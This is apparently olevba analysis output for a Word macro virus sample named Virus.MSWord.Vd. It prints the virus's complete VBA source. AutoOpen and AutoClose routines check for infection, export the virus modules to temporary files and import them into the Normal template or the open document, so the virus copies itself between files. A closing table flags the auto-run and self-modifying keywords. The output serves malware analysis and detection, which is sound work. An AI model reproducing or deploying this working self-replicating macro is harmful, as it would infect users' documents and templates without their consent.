olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vd-78d30cc1dd912f55e8e2efb17285f3bb3948bbac
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vd-78d30cc1dd912f55e8e2efb17285f3bb3948bbac - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VD_2_Module_1_qwertyuiop.bas 
in file: Virus.MSWord.Vd-78d30cc1dd912f55e8e2efb17285f3bb3948bbac - OLE stream: 'Macros/VBA/VD_2_Module_1_qwertyuiop'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
  N_I = Normal_Infected(Count)
  A_I = Active_Infected(Count)
  If N_I And A_I Then
    Exit Sub
  ElseIf N_I Then
    Flag = Export_From_Normal()
  ElseIf A_I Then
    Flag = Export_From_Active()
  End If
End Sub
Sub AutoClose()
  N_I = Normal_Infected(Count)
  A_I = Active_Infected(Count)
  If N_I And A_I Then
    Exit Sub
  ElseIf N_I Then
    Flag = Import_In_Active(ErrorCode)
    If Not Flag Then MsgBox "Error Code " + Str$(ErrorCode), , "Import_In_Active"
  ElseIf A_I Then
    Flag = Import_In_Normal(ErrorCode)
    If Not Flag Then MsgBox "Error Code " + Str$(ErrorCode), , "Import_In_Normal"
  End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VD_2_Module_2_qwertyuiop.bas 
in file: Virus.MSWord.Vd-78d30cc1dd912f55e8e2efb17285f3bb3948bbac - OLE stream: 'Macros/VBA/VD_2_Module_2_qwertyuiop'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function Normal_Infected(CountOurModulesInNormal) As Boolean
  Counter = NormalTemplate.VBProject.VBComponents.Count
  If Counter > 1 Then
    For i = 1 To Counter
      If Left$(NormalTemplate.VBProject.VBComponents.Item(i).Name, 12) = "VD_2_Module_" Then
        Flag = True
        CountOurModulesInNormal = CountOurModulesInNormal + 1
      End If
    Next
  End If
  Normal_Infected = Flag
End Function
Function Active_Infected(CountOurModulesInActive) As Boolean
  Counter = ActiveDocument.VBProject.VBComponents.Count
  If Counter > 1 Then
    For i = 1 To Counter
      If Left$(ActiveDocument.VBProject.VBComponents.Item(i).Name, 12) = "VD_2_Module_" Then
        Flag = True
        CountOurModulesInActive = CountOurModulesInActive + 1
      End If
    Next
  End If
  Active_Infected = Flag
End Function
Function Export_From_Normal() As Boolean
  On Error GoTo CheckError
  Counter = NormalTemplate.VBProject.VBComponents.Count
  If Counter > 1 Then
    For i = 1 To Counter
      Det = Left$(NormalTemplate.VBProject.VBComponents.Item(i).Name, 13)
      If Left$(Det, 12) = "VD_2_Module_" Then
        FileName = Application.StartupPath + Det + ".tmp"
        NormalTemplate.VBProject.VBComponents.Item(i).Export (FileName)
      End If
    Next
    Export_From_Normal = True
  End If
CheckError:
End Function
Function Export_From_Active() As Boolean
  On Error GoTo CheckError
  Counter = ActiveDocument.VBProject.VBComponents.Count
  If Counter > 1 Then
    For i = 1 To Counter
      Det = Left$(ActiveDocument.VBProject.VBComponents.Item(i).Name, 13)
      If Left$(Det, 12) = "VD_2_Module_" Then
        FileName = Application.StartupPath + "\" + Det + ".tmp"
        ActiveDocument.VBProject.VBComponents.Item(i).Export (FileName)
      End If
    Next
    Export_From_Active = True
  End If
CheckError:
End Function
Function Import_In_Normal(ErrorCode) As Boolean
  On Error GoTo CheckError
  Flag = Active_Infected(Count)
  For i = 1 To Count
    FileName = Application.StartupPath + "\VD_2_Module_" + LTrim$(Str$(i)) + ".tmp"
    NormalTemplate.VBProject.VBComponents.Import (FileName)
  Next
  Import_In_Normal = True
  Exit Function
CheckError:
  Import_In_Normal = False
  ErrorCode = Err
End Function
Function Import_In_Active(ErrorCode) As Boolean
  On Error GoTo CheckError
  Flag = Normal_Infected(Count)
  For i = 1 To Count
    FileName = Application.StartupPath + "\VD_2_Module_" + LTrim$(Str$(i)) + ".tmp"
    ActiveDocument.VBProject.VBComponents.Import (FileName)
  Next
  Import_In_Active = True
  Exit Function
CheckError:
  Import_In_Active = False
  ErrorCode = Err
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
